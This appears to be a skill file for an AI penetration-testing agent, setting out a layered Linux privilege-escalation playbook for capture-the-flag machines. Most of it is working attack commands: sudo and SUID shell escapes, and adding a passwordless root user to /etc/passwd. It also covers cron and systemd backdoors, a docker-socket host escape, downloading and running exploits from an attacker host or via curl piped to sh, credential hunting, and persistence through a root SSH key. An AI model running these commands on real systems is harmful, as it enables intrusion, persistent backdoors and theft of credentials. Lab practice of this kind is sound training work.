---
name: privilege-escalation-knowledge
description: Comprehensive knowledge about Linux privilege escalation. Provides methodologies for enumerating and exploiting privesc vectors including SUID binaries, sudo permissions, capabilities, kernel exploits, cron jobs, and common misconfigurations. Includes systematic approach to capturing root flags.
---

# Privilege Escalation Knowledge Base

## Purpose
This knowledge base provides comprehensive privilege escalation methodologies for Linux systems. It covers escalating from low-privilege users (www-data, user) to root, then capturing the root flag.

## Layered Privilege Escalation Strategy

**Core Principle:** Escalate systematically through 3 layers - from quick wins to exhaustive enumeration.

### Layer Framework:

```
Layer 1 (Quick Wins - Manual):
  - Check most common vectors immediately
  - Goal: Find easy privesc within 2-3 minutes
  - Focus: sudo -l, SUID, obvious misconfigurations
  - Time: 2-5 minutes

Layer 2 (Deep Enumeration - Automated):
  - Run comprehensive enumeration tools
  - Goal: Find all possible privesc vectors
  - Focus: linpeas, linenum, pspy
  - Time: 5-15 minutes

Layer 3 (Alternative Methods):
  - Try less common vectors or kernel exploits
  - Goal: Find overlooked or complex privesc paths
  - Focus: Kernel exploits, container escape, NFS, etc.
  - Time: Variable
```

**Escalation Triggers:**
- Layer 1 finds nothing obvious → Run Layer 2 enumeration
- Layer 2 finds vectors but exploitation fails → Try Layer 3 alternatives
- Layer 3 fails → Re-examine reconnaissance, may have missed service/config

## Core Strategy

Systematic execution:
1. **Quick Wins** (Layer 1): Check easy vectors first (sudo, SUID, capabilities)
2. **Deep Enumeration** (Layer 2): Use automated tools to find all vectors
3. **Alternative Vectors** (Layer 3): Kernel exploits, container escape, NFS
4. **Exploitation**: Execute chosen privesc method
5. **Root Flag**: Locate and read root.txt
6. **Verification**: Confirm root access with `id`, `whoami`

## Tools Available

### Enumeration Scripts
- `linpeas.sh` - Comprehensive automated enumeration
- `linenum.sh` - Alternative enumeration script
- `pspy` - Monitor processes without root

### Manual Commands
- `sudo -l` - Check sudo permissions
- `find / -perm -4000 2>/dev/null` - Find SUID binaries
- `getcap -r / 2>/dev/null` - Find capabilities
- `crontab -l` - Check user cron jobs
- `cat /etc/crontab` - Check system cron jobs

### References
- GTFOBins (https://gtfobins.github.io/) - SUID/sudo exploitation
- PayloadsAllTheThings - Privesc cheatsheet

## Enumeration Workflow

### Phase 1: Quick Manual Checks

Execute these immediately:

```bash
# 1. Check current user and groups
id
groups

# 2. Check sudo permissions (most common vector)
sudo -l

# 3. Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 4. Check writable files in /etc
find /etc -writable -type f 2>/dev/null

# 5. Check for interesting files
ls -la /home/*/
ls -la /root/
ls -la /opt/
ls -la /var/www/html/

# 6. Check running processes
ps aux | grep root

# 7. Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# 8. Check capabilities
getcap -r / 2>/dev/null
```

### Phase 2: Automated Enumeration

Download and run linpeas:

```bash
# Download linpeas
cd /tmp
wget http://YOUR_IP:8000/linpeas.sh
# Or
curl http://YOUR_IP:8000/linpeas.sh -o linpeas.sh

# Make executable
chmod +x linpeas.sh

# Run and save output
./linpeas.sh > linpeas-output.txt 2>&1

# Review output
cat linpeas-output.txt | grep -i "PEASS\|password\|ssh\|priv"
```

If can't download, use one-liner:

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Common Privilege Escalation Vectors

### 1. Sudo Abuse (Most Common)

```bash
# Check what you can run as root
sudo -l

# Common exploitable commands:
# - vim: sudo vim -c ':!/bin/sh'
# - nano: sudo nano, then Ctrl+R Ctrl+X, type: reset; sh 1>&0 2>&0
# - less: sudo less /etc/profile, then !sh
# - man: sudo man man, then !sh
# - find: sudo find . -exec /bin/sh \; -quit
# - awk: sudo awk 'BEGIN {system("/bin/sh")}'
# - perl: sudo perl -e 'exec "/bin/sh";'
# - python: sudo python -c 'import pty;pty.spawn("/bin/bash")'
# - git: sudo git -p help config, then !sh

# GTFOBins template:
# 1. Identify binary you can sudo
# 2. Search GTFOBins for that binary
# 3. Follow exploitation steps
```

### 2. SUID Binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Compare with standard SUID binaries
# Unusual ones are interesting

# Common exploitable SUID binaries:
# - /usr/bin/python
# - /usr/bin/perl
# - /usr/bin/php
# - /usr/bin/vim
# - /usr/bin/find
# - /usr/bin/nmap (old versions)
# - Custom binaries

# Exploitation examples:

# Python SUID
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Vim SUID
/usr/bin/vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# Find SUID
/usr/bin/find . -exec /bin/sh -p \; -quit

# Check GTFOBins for specific binary
```

### 3. Capabilities

```bash
# Find capabilities
getcap -r / 2>/dev/null

# Exploitable capabilities:
# - cap_setuid+ep on python/perl/ruby
# - cap_dac_read_search for reading any file

# Python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### 4. Writable /etc/passwd

```bash
# Check if /etc/passwd is writable
ls -la /etc/passwd

# If writable, add root user
echo 'hacker:$6$salt$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd

# Or simpler (password: hacker)
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd

# Login as new root user
su hacker
```

### 5. Cron Jobs

```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Look for:
# 1. Scripts run as root
# 2. Writable by your user

# If found writable script run by root
echo '#!/bin/bash\nchmod +s /bin/bash' > /path/to/script.sh

# Wait for cron to run (check schedule)
# Then execute
/bin/bash -p
```

### 6. Writable Service Files

```bash
# Check for writable systemd services
find /etc/systemd/system/ -writable 2>/dev/null

# If found, modify ExecStart
[Service]
ExecStart=/bin/bash -c 'chmod +s /bin/bash'

# Restart service
systemctl restart vulnerable.service

# Execute SUID bash
/bin/bash -p
```

### 7. Kernel Exploits (Last Resort)

```bash
# Check kernel version
uname -a
uname -r

# Search for kernel exploits
searchsploit "linux kernel $(uname -r)"
searchsploit "ubuntu privilege escalation"

# Common kernel exploits:
# - DirtyCOW (CVE-2016-5195)
# - Dirty Pipe (CVE-2022-0847)
# - PwnKit (CVE-2021-4034)

# Example: Dirty Pipe
wget http://YOUR_IP:8000/dirtypipe.c
gcc dirtypipe.c -o dirtypipe
./dirtypipe
```

### 8. Docker/Container Escape

```bash
# Check if in Docker
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# If docker socket is accessible
find / -name docker.sock 2>/dev/null

# If found /var/run/docker.sock
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or check for privileged container
fdisk -l
# If you can see host disks, you're privileged
```

### 9. Credentials in Files

```bash
# Search for passwords
grep -r "password" /var/www/html/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
find / -name "*.config" -o -name "*.conf" 2>/dev/null | xargs grep -i "password"

# Check history files
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null

# Check for SSH keys
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# Database credentials
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
```

### 10. NFS Exports

```bash
# Check NFS exports
cat /etc/exports

# If no_root_squash is set
# Mount on attacker machine:
mkdir /tmp/mount
mount -t nfs TARGET:/share /tmp/mount
# Create SUID binary as root on attacker
cp /bin/bash /tmp/mount/bash
chmod +s /tmp/mount/bash
# Execute on target
/share/bash -p
```

## Exploitation Process

### Step 1: Identify Vector

Based on enumeration, choose best vector:
1. **Sudo permissions** - Highest priority, usually easiest
2. **SUID binaries** - Check against GTFOBins
3. **Capabilities** - Less common but powerful
4. **Cron jobs** - May require waiting
5. **Kernel exploits** - Last resort, can crash system

### Step 2: Execute Privesc

```bash
# Example: Sudo vim exploitation

# 1. Verify you can run it
sudo -l
# Output: (root) NOPASSWD: /usr/bin/vim

# 2. Execute vim as root
sudo vim

# 3. In vim, type:
:set shell=/bin/bash
:shell

# 4. Verify root
id
# Output: uid=0(root) gid=0(root)
```

### Step 3: Stabilize Root Access

Once root, ensure you can maintain access:

```bash
# Add SUID to bash (backup method)
chmod +s /bin/bash

# Or add SSH key
mkdir -p /root/.ssh
echo 'YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

## Root Flag Capture

### Locate Root Flag

```bash
# Common locations
cat /root/root.txt
cat /root/flag.txt

# Search if not found
find /root -name "*.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null
```

### Verify Flag Format

```bash
# Should be 32-character hex string
cat /root/root.txt | wc -c  # Should be 33 (32 + newline)
cat /root/root.txt | grep -E '^[a-f0-9]{32}$'
```

### Update State

```bash
# Save root flag
ROOT_FLAG=$(cat /root/root.txt)
echo "Root flag: $ROOT_FLAG"

# Update state file (if accessible)
jq --arg flag "$ROOT_FLAG" '.flags.root = $flag' .pentest-state.json > tmp.json && mv tmp.json .pentest-state.json
```

## Troubleshooting

### Can't Download Tools

```bash
# Method 1: Python HTTP server (on attacker)
python3 -m http.server 8000

# Method 2: Base64 transfer
# On attacker:
base64 linpeas.sh | xclip -selection clipboard
# On target:
echo 'BASE64_STRING' | base64 -d > linpeas.sh

# Method 3: Use built-in tools only
# Manual enumeration with find, grep, etc.
```

### No Write Permissions

```bash
# Try /tmp
cd /tmp
# Or /dev/shm
cd /dev/shm
# Or current user home
cd ~
```

### Stuck/No Vectors Found

```bash
# Re-run enumeration more carefully
# Check linpeas output for anything yellow/red
cat linpeas-output.txt | grep -E "PEASS|95%|99%"

# Check for overlooked vectors:
# 1. Environment variables with passwords
env | grep -i "pass\|pwd\|key"

# 2. Process command lines
ps auxww | grep -i "password\|pass"

# 3. World-writable scripts
find / -perm -002 -type f 2>/dev/null

# 4. Misconfigured files
ls -la /etc/shadow /etc/passwd

# 5. Backup files
find / -name "*.bak" -o -name "*.backup" 2>/dev/null
```

## Output Format

After successful privilege escalation:

```json
{
  "status": "root_access_gained",
  "method": "Sudo vim exploitation via GTFOBins",
  "vector": "sudo -l showed vim with NOPASSWD",
  "root_flag": "f6e5d4c3b2a1098765432109876543210",
  "exploitation_time": "2 minutes",
  "mission_complete": true
}
```

## Success Criteria

Mission complete when:
1. ✅ Root access obtained (uid=0)
2. ✅ Root flag located and read
3. ✅ Flag is 32-character hexadecimal string
4. ✅ Both user and root flags captured
5. ✅ State file updated with both flags

## Decision Tree

```
Initial Access Gained
│
├─ Run: sudo -l
│  ├─ Can sudo something? → GTFOBins → Root
│  └─ No sudo → Continue
│
├─ Find SUID binaries
│  ├─ Found unusual SUID? → GTFOBins → Root
│  └─ No exploitable SUID → Continue
│
├─ Check capabilities
│  ├─ cap_setuid on python/perl? → Exploit → Root
│  └─ No caps → Continue
│
├─ Check cron jobs
│  ├─ Writable script run as root? → Backdoor → Wait → Root
│  └─ No cron → Continue
│
├─ Run linpeas
│  └─ Follow red/yellow findings
│
└─ Kernel exploit (last resort)
   └─ Search and compile exploit
```

## Key Principles

1. **Systematic approach** - Don't skip steps, check everything
2. **Quick wins first** - sudo before kernel exploits
3. **GTFOBins is your friend** - Use it for SUID/sudo
4. **Verify before claiming** - Ensure you have actual root
5. **Capture the flag** - Read root.txt content, not just location
6. **Non-interactive aware** - Some exploits need TTY, adapt accordingly

## Remember

- Most playground machines have obvious privesc vectors
- Sudo misconfigurations are most common
- SUID binaries are second most common
- Kernel exploits are rarely needed in playgrounds
- The root flag MUST be read - don't declare success without it
- Document successful method for learning and future reference

## Mission Complete

When you can execute:
```bash
# whoami
root
# cat /root/root.txt
a1b2c3d4e5f6789... (32-char hex)
```

Mission accomplished! Update coordinator with both flags.
